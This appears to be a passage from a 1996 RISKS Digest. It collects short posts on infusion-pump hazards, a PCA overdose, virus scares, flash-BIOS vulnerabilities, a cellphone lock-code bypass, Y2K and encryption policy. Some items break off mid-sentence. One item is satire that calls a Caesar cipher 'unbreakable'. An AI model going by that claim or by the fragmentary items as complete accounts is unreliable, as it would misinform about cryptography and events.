practitioners are able to make these devices work despite the variety of
circumstances and limitations under which they are employed.  Most pumps
reflect a narrow balance between competing demands on designers.  I have a
nice figure that will be in a paper to be published late this year on the
subject.  Briefly, there is competition between capability of the device,
the complexity introduced by managing capability, and engineering issues,
especially power budget and display cost.  The risks of infusions are too
numerous to list here but one problem is the consequence of a mechanical
infusion into a non-intravascular space.  IV catheters can become
"infiltrated" in which case the infusion is no longer intravenous but
subcutaneous (or intramuscular, etc.) with associated consequences.  The use
of gravity to drive fluids sets and upper limit on applied pressure and
hence on the likely consequences of infiltration: in most cases, an
infiltrated IV simply stops running and is replaced.  Resistance to fluid
flow, however, follows Poiseuille's law and is proportional to the fourth
power of the radius.  Thus flows through small IVs are limited and higher
pressures are needed and a pump may be used, although the risk of forcing
fluid into an infiltrated IV is now present.  Pumps are designed with
various control parameters, including the maximum permissible pressure
applied to the fluid and this value is (for some) programmable.  It is quite
possible to have an undesirable set of circumstances when infusing fluids
under pressure (e.g. the mass effect of a liter of fluid in the subcutaneous
space of the arm can cause vascular compromise and subsequent tissue loss,
some drugs are toxic to tissue and must be diluted by high blood flow and
infusion of these into the non-vascular space can cause limb loss, etc. etc
etc.) so pump manufacturers are understandably chary of these settings and
many pumps have elaborate programming requirements.  The point is that
resolving these sorts of problems is non-trivial.
<P>
The notion of "standard" for everything is superficially attractive, but
most often the desire reflects a form of magical, wishful thinking: if
things were simple there wouldn't be a problem so our task is to make them
simple.  But things are complicated because the world is complicated and we
are doing complicated things.  Indeed, I would argue (see first ref.
above), that much of the problem we have with medical devices is the result
of designers attempting to produce a device surface that _appears_ simple
but actually hides a wealth of complexity.  I sometimes call this the "thin,
thin, thin computer candy shell" that hides the device from the user.
Unfortunately, the user is still responsible for the operation of the device
and (see 2nd ref) for diagnosing device failures.  This problem is not
addressed by standards or guidelines but rather by a prudent and detailed
approach to design (viz. Norman's books, Rasmussen's books, etc.).

Incorrect use of IV pumps in hospitals can be much more serious than the
different needle sizes recently mentioned by Ry Jones.  To permit patients
to get pain relief without waiting for the nurses there are devices known as
PCAs (Patient Controlled Administration).  These are computer controlled
infusers which are piggy-backed onto an IV line.  They can be programmed to
deliver a certain continuous dosage and to permit the patient to press a
button for additional pain reliever in specified amounts at specified
intervals.  This should permit them to insure that no more than a prescribed
dose is given during any time interval.  These devices also record a history
log which can be used to determine how often the patient is demanding the
drug.  And the front panel locks to prevent the patient from modifying the
dosage.
<P>
The (semi-)standardized interface to these is that all analgesics must
come in 30 ml syringes in order to fit the pump mechanism.  The
problem with this is that different analgesics come in different
concentrations.  Demerol comes as 10 mg/ml, but morphine is 1 mg/ml,
etc.  The PCA interface requires the dosages to be specified in mg per
unit time, but the PCA itself can only measure ml, so in addition to
all the dosage information the nurse must also tell the PCA what is
the concentration of the drug in the syringe.
<P>
Recently I witnessed an incident where an entire day's worth of
Demerol was infused in 2 hours.  After administering an antidote, two
nurses tried to figure out what had gone wrong.  One of them explained
to the other that the programmed concentration had been 1 mg/ml
instead of 10 mg/ml, so the PCA had delivered the drug 10 times faster
than prescribed in order to satisfy its instructions.  The RISKS of
this are pretty obvious.

&gt; But the error probably wouldn't have existed in the first place<BR>
&gt; if the conversion code had been written with floating point instead<BR> 
&gt; of integer arithmetic.
<P>
Excuse me?  I hate to climb on my soapbox again, but this shows a remarkable
misunderstanding of both floating-point (in)accuracy and date conversion.
Dates as measured by computers are inherently integers, and thus should
*never* be manipulated using floating-point code.  If you're representing
down to seconds, you can fit nearly 70 years into 32 bits (cf. Unix).  If
you need more than that, it's very easy to use a 64-bit representation, and
convert it to two 32-bit quantities (such as julian date plus seconds within
year) early in the manipulation, even if your computer doesn't support
64-bit arithmetic.  If you need high resolution (e.g., nanoseconds) you
might need to use 96 bits, but it's still trivial to break things down into
quantities that are easily handled.  I'll agree that the 48-bit manipulation
in assembly was probably convoluted, but floating-point is not the proper
solution.  It makes me shudder.

The papers are reporting that potential disaster has been averted in the
Canadian financial community.  5200 disks containing information on the
Canadian Federal Budget were pulled, only hours before they were due to be
shipped, when a virus was discovered on them.  ThunderByte Scan is being
credited, since the master disk was allegedly checked twice before leaving
the Finance Department, and ThunderByte is an "advanced" antiviral product.
<P>
There are, however, a few questions to be answered.  How come nobody checked
*before* they made 5200 copies?  Is it possible that the duplication machine
was infected?  (Unlikely: duplicators usually have specialized equipment.
But possible.)  And, what virus was found?
<P>
Ah, this last is the cruncher.  Nobody has said what virus it was, yet lots
of people are saying that computers across the country could have been shut
down.  In actual fact, nobody *knows* what virus was found.  The closest
report I have been able to get from a knowledgeable source (and that source
is none to close) reports that ThunderByte reported an *unknown* boot sector
infector.  (Remember, ThunderByte is an "advanced" antiviral.  It uses
heuristics.  It's guessing.)  It is possible that ThunderByte has detected a
new, and previously unknown, virus.
<P>
It is also possible that there is no virus at all.
#<P>
It is very likely that we never will know whether there was a virus or not.
Although press reports indicate that the RCMP is investigating, a lot of
other people appear to have done their own investigations first.  Thus, if
the disks *are* found to be infected, who knows *where* they got infected.

city of Bonn, Germany, the new ROT n+1 algorithm was invented by Peter
Simons, a 22 year old student of Computer Science.

``I had the idea for the algorithm in 1993, when I was reading Douglas
Adams' famous book "Hitchhiker's Guide to the Galaxy". In one chapter Adams
was talking about bistromatics, a newly discovered branch of mathematics.
He furthermore wrote, that the phenomenon of numbers behaving differently
in a restaurant was well known to the common people, just, nobody took the
time to really research the behavior.

``Then the idea of the n+1 phenomenon struck me. It happens every day. You
have carefully planned your trip to the airport to reach your plane in time.
You absolutely have to be there at 7:00 AM, not a minute later.  Though you
can be sure that due to mystical events, you'll reach the airport exactly at
7:01 AM. Or take the case of ordering a pizza. You have exactly $20 in your
wallet and you order a pizza and drinks for just that amount. And when the
delivery service arrives, you notice the $1 fee for orders after 4PM.

``I thought about using this law of nature for cryptographical purposes and
ROT n+1 was almost invented. I was still missing the tools to device this
effect, though. It took me three years of research to come up with a method
to control the n+1 effect: Reverse Temporal Engineering.''

Unfortunately the details of Reverse Temporal Engineering are patented by
Peter Simons and must not be described in detail here. To summarize it: You
make up a random number. Then you take the ASCII-representation of your
plaintext and add the number to each byte. If the result lies beyond the
'z' character, you'll simply start over with an 'a' again. Just like it has
been done by Caesar a two-thousand years ago.

Formally, the algorithm is described as follows (readers who are not
mathematically oriented might want to skip this paragraph): f() is the
function which yields the numerical-representation of a character. f'() on
the other hand, yields the character represented by the number, it receives
as parameter:

(1)     f'(f(x)) = x

Given the magical number n and the pool of available characters Z, the
encryption works as follows:

(2)     f'((f(x)+n) mod |Z|)

Decryption is done just the other way round:

(3)     f'((f(x)-n) mod |Z|)

If both, the sender and the recipient, use the same character set and the
same key n, the system works. So far so good.

Of course anybody can attack use brute force to attack the encrypted
message, simply by trying all possible 'n's. Due to the modulo operation, n
is actually limited to the number of characters available, usually less
than 60 or 70 characters. A brute force attack can be done by anybody
fortunate enough to own a piece of paper and a pencil, not even to mention
todays high-power computers.

Here comes the Temporal Reverse Engineering into play. The message is not
really encrypted with n, but with n+1. Not literally n+1, but the "n+1
effect" Peter described above. n is not a fixed constant, it is a flowing
number always escaping your attempts to catch it. When you attack the
message with "1", the real n will be "2". But when you try "2", n will
already be "3". There's no way to catch it unless someone proves that the
natural number do have a upper limit. Only the indented recipient is able to
use the real n -- for reasons, nobody but Peter Simons quite understands.

One even more obscure thing is, that you are able to choose zero (0) as
encryptor, which does not encipher the message at all. Nonetheless, nobody
but the recipient will be able to read it!

It isn't astonishing at all, that the infamous three letter agencies are
not very fond of this invention. For decades, they fought their battle
against encryption algorithms invented by the so called "opponent". But
here comes an opponent they will not be able to beat. ROTn+1 gives
unbreakable encryption to the masses. And unlike, say, RSA, it doesn't
require much computer power to utilize it. The encryption itself is very
straightforward and the determination of n can be done by a three year old
child. Peter Simons has been quoted saying that ``the Temporal Reverse
Engineering is so damned easy, you wouldn't even believe it if I told you
how it works''.

Furthermore he said: ``My ROTn+1 algorithm renders all cryptographic
software in existence useless. Throw it away. PGP? Forget about it.
Clipper? An April fools day joke -- not more.''

A recent posting in comp.firewalls describes a new kind of PC virus.
This one zaps the flash BIOS of Pentium motherboards.

What makes it more interesting is that on the Endeavour EV-2 motherboards
this behaviour is a killer, it renders it unusable; see:

<A HREF="http://www.mrbios.com/ftp/big_risk.txt">http://www.mrbios.com/ftp/big_risk.txt</A>

As it seems, this particular motherboard features: "(1) Its flash ROM does
NOT implement a write-protected failsafe recovery "boot-block".  (2) The
flash ROM is soldered directly onto the system board.  If anything at all
happens to the flash that causes it to be inoperable, no practical method
exists to restore it.  No "recovery" utility can be run if the system won't
boot."

I can't but wonder what kind of demential design gave birth to such a
sensitive piece of hardware: the BIOS ROM in a PC is a fundamental part of
it: without it the machine is totally unusable. A FlashROM is by definition
writable, and as such one can expect that a variety of circumstances may
erase or rewrite it with bad data. And there are many!

Not having a protected recovery block is bad enough. But soldering it so it
can't be replaced is something I can't but qualify as "evil" (or "greedy" at
least).

The RISKs? Just let your imagination run wild: viruses like the
'Flash_killed' one, programming errors (yes, I've zapped the BIOS config of
a PC this way a couple of times), power failures, using the wrong BIOS image
or loader for an update, etc... Any of them (and many more) will render the
machine totally worthless.

Treasury Secretary Robert Rubin has admitted to a congressional committee

the multibillion modernization effort intended to replace the Sixties-era
mainframes now in operation at the Internal Revenue Service and to link IRS
offices across the nation.  Congressman Jim Lightfoot characterized the
project as "a $4-billion fiasco that is floundering because of inadequate

has not read) is a highly technical 6,000-page document that "is not what

I think PGN has a very good proposal, and there's an addendum I'd like to
make. In English, we have a little used stress mark that denotes precisely
what you mention, although in the general case. This stress mark is called
the diaeresis, and it looks like (and is commonly confused with) the umlaut
that German has.

The purpose of a diaeresis is to note that a vowel is supposed to be
pronounced when ordinarily it would not be. For example, the word
"co=F6perate" has a diaeresis on the second "o" so we can tell the difference
between "working with" (co - operate) and "the process of becoming someone
who makes barrels" (cooper-ate). Similarly, the word "na=EFf" is spelled
with a diaeresis on the "i" so we know it is pronounced "nigh-EEF" and not
"nay-f." It is also used on a final vowel that would ordinarily not be
pronounced, like in the name "Bront=EB."

In the past in RISKS we've talked about the hazards that have come from
losing punctuation marks -- for example, the people who refused to stop
spelling their name with an umlaut. While these problems are less
wide-spread in English than some other languages, they still exist. Computer
scientists have only recently admitted that there are lower case letters,
and only the howling of Europeans got accented characters into ISO Latin-1.
Anglophones had to put up with na=EFve people who thought there were no
accents in English, or were used only by people putting on some sort of a
r=F4le. Even today, the Unicode folk still refuse to admit that there is
such a thing as lower case numerals (yes, there are, and no they are NOT
simply a display style), and I strongly suspect that the diaereses I put
here (and shock horror, a circumflex) will get eaten somewhere along the
way, most likely because early computer people could not count past seven
unaided.

Nonetheless, I don't think we should be daunted. We should use good old
English, and spell "e-mail" "=EBmail". It looks cool (why do you think you
see them liberally slathered on heavy-metal albums?), and best of all, it's
correct usage. The diaeresis means to pronounce the e, so when some tin-horn
techno-pedant complains, you can put them in their place and show them how
us real technos do things.

[Not a bad idea for folks who can deal with diaeresis, but
there are still lots of problems that does not handle.  PGN]

See http:/www.health.gov.bc.ca/newsrel/nrdate.html

How does this relate to computers, since the root issues are generic?

Well, for one thing having the data in machine readable form makes it
much easier to merge and relate data and perform this kind of data mining.

For another thing, the Single Payer system assigns unique province wide
Practitioner ID numbers that makes it easier to relate data from separate
points of sale. The same applies to Personal Health Numbers, but that
doesn't seem to be at issue in this matter.

Finally, when systems interact, it doesn't seem to be enough to ensure that
Privacy/Confidentiality is protected on just one system. While Pharmanet
wasn't the source of this information it defines a province wide standard
that could simplify the task of combining information from different points
of sale.

For background the URL above has a couple of press releases about Minister's
statements about regulation of Pharmaceutical company prices and profits.

the Mulroney government ended "compulsory licencing" about a decade ago.

The subject of asynchronous, real-time, HMI design has been addressed
(although almost certainly not yet "infallibly") by the literature in our
field.  As implied by Lauren Weinstein, however, in 'Technology
"deterioration" ' earlier in the same issue of RISKS, the difficulty in
keeping up with the literature is obviously a problem that contributes to
risks.

For those who are interested, the end of section 15.4.5 of Nancy Leveson's
book "Safeware: System Safety and Computers," Addison-Wesley, contains an
extract of a fuller discussion found in "Implications of the man-machine
interface for software requirements completeness in real-time,
safety-critical software systems," Proceedings of IFAC/IFIP SAFECOMP '89,
Dec, 1989.  The original IFAC article, addresses (among other topics)
exactly the situation that Dick Mills described above and presents a design
principle to prevent such situations --- disclaimer: Leveson and I wrote
that article so mine is not an unbiased recommendation.  It is also true
that our solution, intended for safety critical systems, seems too elaborate
for a simple, non-critical device such as a car radio.  But, for
safety-critical systems, some principles are known --- there might not need
to be quite so much cause for despair.

That is not to say that NO bad effects are possible; even in _verite'_
systems, combining two devices can have unpleasant side effects.  My new
1996 Chevy Lumina (generally an excellent specimen) exhibits such an effect.
It has a radio with a built-in cassette player, just like my old 1990 Chevy
Lumina (they're kinda habit-forming...).  Well, not *just* like the 1990
model - the 1996 model has added a feature called a "cut tape detector".
This device somehow (tension?  optics?) continuously monitors the deck to
insure that there is really tape running through the play heads.  If it
determines that there's no tape, it assumes that instead of running through
the heads, the tape is snarling up inside the deck, and it ejects the
cassette.

This is a nice feature from some points of view, but from my perspective
it's a dead loss.  Why?  Because I almost never use the cassette player to
play tapes; in the 1990 Lumina I use it, with a Radio Shack adaptor, to play
CDs on a portable CD player.  But on the 1996 Lumina, I can't do this,
because the CD-cassette adaptor has no tape!  It just has a magnetic head
which mates with the read head in the tape deck and "pretends to be a tape"
from the point of view of the read head.

No one has yet produced a CD-cassette adaptor which *also* pretends to be a
tape from the point of view of the cut-tape detector, so I can't listen to
CDs in the new car.  (Naturally, I didn't know about this "feature" when I
decided against the CD player option in the 1996 model...)

I've found a number of `technologically deficient' `features' in cellular
telephone equipment, having had various phones over the last eight years
(right now I'm on my fourth, a handheld with a booster in the car).

Brand X telephone uses only a three-digit lock-code, and the lock code is
not changeable by the user.  This same Brand X telephone displays the phone
number at power-up.  Given that the initial lock code put in by the cellular
vendor is the last X digits of the phone number, this isn't very secure.
You have to take the phone back to the vendor to change the lock code.

Brand Y telephone has a four-digit lock code and a five-digit security code.
The lock code is used to lock/unlock the phone and set a few security
parameters, and is resettable by the user.  The security code is used to
validate other parameters (including the lock code), and may not be reset by
the user.  The default settings are very easy.

It is entirely possible, using the security code, to reset the lock code on
a locked Brand Y phone, rendering the locking useless.  I proved it to
myself yesterday.

One of IBM's World Wide Web sites contains an interesting summary of
issues relating to the use of 6-digit dates and 2-digit years where the
century was not included and thus are now and will cause problems in the
future as calculations and other manipulations of dates will erroneously
consider Saturday, January 1, 2000, to be 01/01/00 and thus an earlier
date than Friday, December 31, 1999, being 12/31/99.

There is a fairly well thought out &lt;a

going to be expensive in people, resource and money terms.

It includes URL references to other documents including an FAQ on the year
2000 problem, an article from

about the issue of two-digit years failing at 01/01/00.

They also have a 500K+ white paper in that can be retrieved in several
formats or in printed form by an E-mail request about the subject and what
to do whether you use IBM hardware/software or not.  The paper can be

&gt;From what I read, it sounded interesting, neither an attempt to minimize
the problem, nor an attempt to overhype it.  It also points out that IBM
was just as much responsible as everyone else was in developing software
using 2-digit years.

I am a bit concerned seeing how many articles in RISKS quote external
document through the use of URLs.  Most of the time it is great how this
makes information easier to get to, but what can we do to protect these
links over time?

RISKS is archived (Thanks!) so important information is preserved.  However,
many recent articles have had key information excluded and replaced with a
URL (a recent article by Fred Cohen &lt;<A HREF="mailto:fc@all.net">fc@all.net</A>&gt; in 17.94 about the incident
at all.net comas to mind, but there are others).

URLs do a great job of handling some of the copyright and ownership issues
as well as reducing clutter and expanding coverage.  But--until we have Ted
Nelsons (possibly utopian) Xanadu Hypertext docuverse with guarantee
persistence of information--URL's will simply decay and destroy information.

I think great care should be taken in such an important archived journal as
RISKS to use URLs with care.  They are great for off-loading long and
boring conference announcement details where there is a built-in time limit
for relevance anyway, but let us all make sure we preserve what is
important.

Honorable Conrad Burns

Dear Chairman Burns:

On behalf of the nation's two leading computing and engineering
associations, we are writing to support your efforts, and the efforts of
the other cosponsors of the Encrypted Communications Privacy Act, to
remove unnecessarily restrictive controls on the export of encryption
technology.  The Encrypted Communications Privacy Act sets out the
minimum changes that are necessary to the current export controls on
encryption technology.  However, we believe that the inclusion of issues
that are tangential to export, such as key escrow and encryption in
domestic criminal activities, is not necessary.  The relaxation of
export controls is of great economic importance to industry and users,
and should not become entangled in more controversial matters.

Current restrictions on the export of encryption technology harm
the interests of the United States in three ways: they handicap American
producers of software &amp; hardware, prevent the development of a secure
information infrastructure, and limit the ability of Americans using new
online services to protect their privacy.  The proposed legislation will
help mitigate all of these problems, though more will need to be done to
assure continued US leadership in this important hi-tech sector.

Technological progress has moved encryption from the realm of
national security into the commercial sphere. Current policies, as well
as the policy-making processes, should reflect this new reality. The
legislation takes a necessary first step in shifting authority to the
Commerce Department and removing restrictions on certain encryption
products.  Future liberalization of export controls will allow Americans
to excel in this market.

The removal of out-dated restrictions on exports will also enable
the creation of a Global Information Infrastructure sufficiently secure
to provide seamless connectivity to customers previously unreachable by
American companies.   The United States is a leader in Internet
commerce.  However, Internet commerce requires cryptography.  Thus
American systems have been hindered by cold-war restraints on the
necessary cryptography as these systems have moved from the laboratory
to the marketplace.  This legislation would open the market to secure,
private, ubiquitous electronic commerce.  The cost of not opening the
market may include the loss of leadership in computer security
technologies, just at the time when Internet users around the world will
need good security to launch commercial applications.

For this legislation to fulfill its promise the final approval of
export regulations must be based on analysis of financial and commercial
requirements and opportunities, not simply on the views of experts in
national security cryptography. Therefore, we urge you to look at ways
to further relax restrictive barriers.

Finally, the legislation will serve all users of electronic
information systems by supporting the development of a truly global
market for secure desktop communications.  This will help establish
private and secure spaces for the work of users, which is of particular
interest to the members of the IEEE/USA and the USACM.

On behalf of the both the USACM and the IEEE/USA we look forward
to working with you on this important legislation to relax export
controls and promote the development of a robust, secure, and reliable
communications infrastructure for the twenty-first century.

Please contact Deborah Rudolph in the IEEE Washington Office at
(202) 785-0017 or Lauren Gelman in the ACM Public Policy Office at (202)
298-0842 for any additional information.

Sincerely,

I attended last week's Sixth Computers, Freedom, and Privacy conference in
Cambridge MA, where policy-makers, technical experts, and activists came
together to hash out the intersection of the three elements of its title.
CFP is an unusual place; the closest thing our community can get to "neutral
ground" on many issues.  This is best expressed by the fact that in the
hallways of the hotel, it's not unusual to see those that supported and
those that fought the Communications Decency Act hob-nobbing it up, trading
friendly swipes about their take on the bill.

In addition, it's always an enjoyable thing to be able to meet an FBI agent
in a neutral setting and ask them questions about their perspective on
various issues.

CFP is still finding it's way, though, as the issues it covers evolve in and
out of the mainstream.  A few years ago the issues were hackers and search
warrants for computers and bulletin boards.  Now that seems to have been
replaced by encryption policy, wiretaps and how much of the First Amendment
applies to the net.

CFP has survived well, and I continue to return every year I can.  I return
not only see the issues from new perspectives, but also to obtain the
synergy that can only happen in a face-to-face encounter.

This isn't to say that CFP doesn't stumble occasionally.  There were a few
panels this year that fell into the CFP trap, where individuals came to
express none-to-fresh perspectives on problems that have been beaten like
the Lone Ranger's dead steed.  Encryption is typically the cause of these.

On the other hand, however, CFP was successful in what is the most
entertaining and enlightening approach to the encryption debate I've seen in
the last two years.  Centering around a mock law that required key escrow,
the CFP program committee set up a "moot court" of five Federal judges (real
ones, with black robes and everything) that heavily questioned attorneys
that presented a cases for the government on one side, and plaintiffs
challenging the law on the other.

The live questioning, and the exercise of having to put one's arguments into
a legal framework was an experience that everyone enjoyed.  This was clearly
the most heavily attended panel of the conference.

The other interesting thing this year was the final panel of the conference,
a reflection on the entire conference done by four science fiction authors:
Bruce Sterling, Vernor Vinge, Pat Cadigan, and Tom Maddox.  This was
probably the most interesting way to reflect on the conference, and the
writers seemed to form a sort of "collective conscience" for the rest of us.

Bruce Sterling, in particular, provided a dystopian view with such a
forceful delivery that I, and many others, probably stumbled from the room
unable to decide if we were happy we knew where we were going, or if we
should run screaming in terror at society's impending train wreck.

It was somewhat appropriate that there was no time for questions after that
panel.  They would have simply detracted from the fact that the writers got
the "last word".

It's a great role though, to have those who dream for us, our science
fiction writers, act as our conscience.  I hope the program committee lets
them do it next year, and I look forward to meeting the next set of faces
that I'll have met on the net over the next year.

A TRAGIC STORY ABOUT A WIRETAP by Shabbir J. Safdar, VTW Board (New York, NY)

This week most of VTW's staff attended the Computers, Freedom, and Privacy
conference in Cambridge Massachusetts.  I go to the conference every year to
recharge my batteries, put names to faces, and enjoy the synergy that can
only come with face-to-face dialogue.

This year the debate over encryption seemed focused on three panels, the
only novel one being a panel which was a "moot court".  Presided over by
five real Federal judges, attorneys for plaintiffs and the government argued
over the Constitutionality of a mock law that would require escrowing of
encryption keys.  Aside from this, the conference added no new material to
the encryption debate.

One valuable experience happened on the way home, however.  I picked up the
New York Times and came across a story in the New York Times Magazine about
a corrupt New Orleans police chief, and how he reacted to a woman who filed
a police brutality complaint against him.

The story goes this way: the FBI was wiretapping a number of New Orleans
police officers who were allegedly guarding a 286 pound shipment of cocaine.
During that time the FBI overheard a conversation between the police chief
and several other police officials that the FBI alleges was a murder plot.
The intended victim had previously filed a police brutality complaint
against the chief.

Although the FBI had the conversation in hand, they were unable to decode
the police chief's "street slang and police jargon" in time to prevent the
murder.  The woman who filed the complaint, a 32 year old mother of three,
was shot while standing in front of her house.

It's easy to be angry about this incident.  One could (and should) be angry
with the murderers and their conspirators.  However out of this comes two
important observations on the encryption policy debate.

One, while wiretaps have probably been effective in other cases, they were
not effective in this one.  While we can grant law enforcement the benefit
of the doubt in other cases, the existence of this one shows that a wiretap
is not the "silver bullet" of law enforcement that we have been led to
believe.

Another observation that can be made is that this parallels the key escrow
debate very closely.  No reasonable person is objecting to the FBI's right
to conduct a wiretap.  However what is being debated is the extent to which
individuals and law enforcement can go to accomplish their duties.  The
Clinton Administration is striving for a world where everyone is forced to
speak in a form of encryption that is easily decoded by law enforcement.
The public and industry is striving for a world where they continue to have
private conversations.

The situational parallel to this would be if the Administration had pushed a
law that requires everyone to speak on the telephone in plain English,
without slang and without any double meanings.  This is the equivalent of
key escrow.

However, would this have really saved the person so tragically killed above?
Unlikely.  Individuals involved in criminal conspiracies will continue to
use whatever means at their disposal to obscure their activities from the
police.  The corrupt police chief who allegedly ordered the murder would
have still used slang and code, regardless of any laws banning such use.  He
was allegedly conspiring to commit a murder, why should he care?

Such laws will, however, affect law abiding citizen's attempts to gain
privacy.  Law-abiding citizens that may be speaking to their doctors,
attorneys, loved-ones, or business partners will continue to be targets of
industrial espionage, private investigators, and, in a few cases, trusted
individuals abusing that trust.

This example from the New York Times Magazine (3/31/96, p.32) shows that
while we can certainly give a little to law enforcement on their arguments
about the effectiveness of wiretaps, they need to give a little in the other
direction on the practicality of forcing people to speak in a
law-enforcement-understandable code.  Obviously, criminals don't care about
such rules.  Since that is the case, is it really worth handicapping all
technology, and exposing individuals to privacy intrusions when such
measures won't even be effective at attaining their stated goals?

In the *Washington Post* 29 March 1996, MCI reported that they will refund
approximately $40 million due to a computer error.  A billing error was
uncovered by an investigative reporter from local television station, WRIC
in Richmond, VA.  The reporters found that they were charged for 4 minutes
after making a 2.5 minute call, leading to an in-depth investigation.

&gt;&gt; ST. LOUIS (AP) -- A St. Louis teen-ager arrested last week near
Philadelphia on computer fraud charges is more than just a kid with a hobby
-- and far more dangerous, federal authorities say.  Christopher Schanot,
19, of High Ridge, Mo., is a computer genius who"hacked" his way into the
computers of some of the nation's largest computers, causing security
breaches that forced at least one company to spend thousands of dollars
fixing.&lt;&lt;

o Authorities claim he's a member of the Internet Liberation Front (ILF).

o He claims to be able to take control of any computer he chooses to.

o He was taken to St. Louis Tuesday with a arraignment and bond hearing set
for Thursday.

o His father was quoted: "If a parent can't monitor the child or if the
parent doesn't understand how the Internet works, the computer's modem
should be unplugged."  The younger Schanot received his first computer at
the age of 4 years.  His father was quoted as instructing him to use only
public access computer systems and, "He was an honor student, really he
was all you could want in a child. It was such a shock to us when he
disappeared."

o He was an honors student at Vianney High School in suburban St. Louis.
Shortly after graduation last summer he went to Philadelphia to "lay low."

o His father became concerned about him and contacted the authorities and
turned over his PC to them.

&gt;&gt;In the computer, authorities found a message headed "Greetings from the
Internet Liberation Front." The message was saved to his computer on
Thanksgiving Day 1994, the day of a computerized "break-in" at NBC.  The
message said the group "has now declared war on any company suspected of
contributing to the final demise of the Internet."  "Big boys" in the
telecommunication industry have turned the Internet "into another
overflowing cesspool of greed," the message added.  "We are capable of
penetrating virtually any network linked to the Internet -- ANY network,"
the message said. &lt;&lt;

[DMK: Gee, that was in RISKS and any number of net-news reports back in 94.
The only reason it's not on _my_ PC is I purged it to save disk space.  Does
that qualify me as a "purged" ILF member?]

o His PC also had hundreds of passwords to corporate computer systems,
including defense contractors and the computers of credit reporting
agencies.  The PC also had AT&amp;T calling card numbers, and credit card
numbers in it.

o He was indicted on five counts (unspecified...18 USC 1029/1030?) last
month.  Max slammer time = 30 years + US$1.25E06 in fines.

o Victims:  Southwestern Bell Telephone, BELLCORE, Sprint, and SRI.

o Time frame: Oct 24, 1994 to Apr 23, 1995

Subject: I Cannot Call The AT&amp;T Operator

While in the US, I recently wanted to find out a number in England, and
since I don't know the local directory enquiries number, I called the AT&amp;T
operator. After dialling "00" the "conversation" between me and the abuser
interface (ABI) was:

ABI: "AT&amp;T. To place a call, please dial the number now, or say
'operator' to be connected to an operator".
Me:  "Operator"
ABI: "Sorry, your response was not understood. To place a call, please
dial the number now, or say 'operator' to be connected to the
operator".
Me:  "Operator"
ABI: "Sorry, your response was not understood..."

Thus the abuser interface would  only allow  me to  do the  single thing
that I didn't know how to do. After a few more abortive attempts I found
that the necessary incantation involved pinching my nose and saying "er-
per-eight-er".

The risk? That people with speech impediments, and ethnic minorities who
do not speak with  a "standard"  US accent (i.e., the  majority of  the
human race!)  cannot be connected with an operator, and are  thus unable
to place telephone calls. The abuser interface would have been perfectly
acceptable if  there had  been an  an additional  escape clause  such as
"...or wait for 30 seconds to be connected to an operator".

On a separate but related issue, can anyone tell me  whether the  codecs
in "digital" cellular phones are usable with non-Indo-European languages
such as:
-   languages  where  the  pitch  is  extremely  important   but  the
"consonants" are  relatively unimportant,  e.g. (I  believe) Mandarin
Chinese
- the African "click" languages

[Tom, ``Standard US?'' Many North "Americans" have troubles.  Regional
dialects here are pretty severe.  But certainly Cockney, Australian
*  ('Strine), and other variants of English are unlikely to be decoded.
I suppose we all need the language training that actors get.  I am always
astounded when I hear a Brit or Aussie actor known for wonderful BEnglish
or AusEnglish dialect speaking perfect AEnglish.  Just a thought.  PGN]

In <A HREF="/Risks/17.95.html">RISKS-17.95</A>, Jacob Palme suggests that the reputation of "well-kept
depositories" and PICS-like ratings can be used to guard against malicious
Java code.  A more useful idea along the same lines is to allow for code to
carry a digital signature.  A user could then configure his browser to
reject code with unknown or incorrect signatures.  A more daring user might
simply want a warning.  Confidence could be placed in code obtained from
anywhere, even a malicious host, as long as the signature is valid and you
trust the entity signing it.

Digital signatures are not a panacea, however.  There are real problems with
key distribution and even the smallest change in the code would require it
to be re-signed.  Further, although digital signatures offer protection from
malicious code, there is still the possibility of bugs with security
implications or other harmful effects.

Frank Stuart

[That is actually similar to the Microsoft CAPI (Cryptographic Application
Programming Interface) concept extended to browsers.  Not a bad idea.
Note: concerning hyphenating vs. hyphen-hating, notice the distinction
between re-signed and resigned.  I won't resign from my crusade.  PGN]

In <A HREF="/Risks/17.96.html">RISKS-17.96</A>, J.R. Valverde talked about the risks of having BIOS stored
in flash RAM (because it's rewritable, I hesitate to call it ROM).  A
similar point was raised by Martin Portman in <A HREF="/Risks/17.58.html">RISKS-17.58</A>, with related
information by Sean Reifschneider in <A HREF="/Risks/17.61.html">RISKS-17.61</A>.  All of these are quite
accurate as to the problem.  The purpose of this posting is to let people
know what's happening to fix the problem.

As part of a project I'm working on, I've been working with some of the
large PC vendors.  What I've found is that virtually all Pentium based PCs
on the market today have the flaw described.  This sort of problem was
almost unknown in the 286/386/486 generations of PCs, which used real ROM
for storing the BIOS.

Some of the hardware manufacturers understand the risk here, and have
started to address it.  One solution adopted by some vendors is to build a
one-way switch in hardware.  Once the switch is "thrown" (by sending
commands to a device on the board), the write signal to the flash ROM
holding the BIOS is disabled until the next power cycle.  Some vendors have
put code in their BIOS to automatically throw the switch before they boot
from the floppy or hard drive.  This prevents any sort of malicious software
from modifying the BIOS.  To allow BIOS updates to occur, the BIOS looks for
a "signature" on the floppy before throwing the switch, and if the signature
is found it doesn't throw the switch.  (The ease of spoofing the signature
is another topic.)

Other vendors have implemented a BIOS modification password, which must
be written to a particular address before the write signal to the
flash is unlocked.  Unfortunately, such a password is usually subject
to a dictionary attack by the malicious software, which would be invisible
to the user.

The good news is that because each vendor has solved the problem
differently, it would be difficult for a virus writer to disable arbitrary
PCs (although they might be able to disable all PCs from a given vendor).
That is, diversity results in resistance to plague.

The bad news is that even for those vendors who are doing a good job
addressing this problem, they can't retrofit machines already in the field,
since it requires a hardware change that isn't economical.  Further, because
there's no way to tell by physical inspection whether a given machine has a
rewritable BIOS, users can't determine whether they're at risk.  Vendors are
reluctant to disclose how they've solved this problem (if at all), which
makes it impossible for users to tell if they're at risk.

Of course the whole problem occurs only because most PCs don't run modern
operating systems that would prevent a virus from directly accessing the
hardware.  For example, a PC running UNIX, OS/2, or NT is immune to these
sorts of viruses except at boot time (which can be addressed using careful
procedures).

Mark Rafn's message in <A HREF="/Risks/17.92.html">RISKS-17.92</A> reminded me of a change I made to the
low-level debugger MacsBug, during development of Macintosh System 7.5.

If the user holds down the Control key during startup, the debugger
intentionally seizes control and says "User break at &lt;useless address&gt;."
Users who aren't expecting this write up bug reports that say "The
system crashes when I hold down the control key during startup."

After the third or so of these reports, I was tired of saying "it's a
feature" and decided to make the situation clearer to the users.  Now
the message reads:

Welcome to MacsBug (Thank you for holding down the Control key)

The bug reports stopped.  Perhaps this message shows an appropriate degree
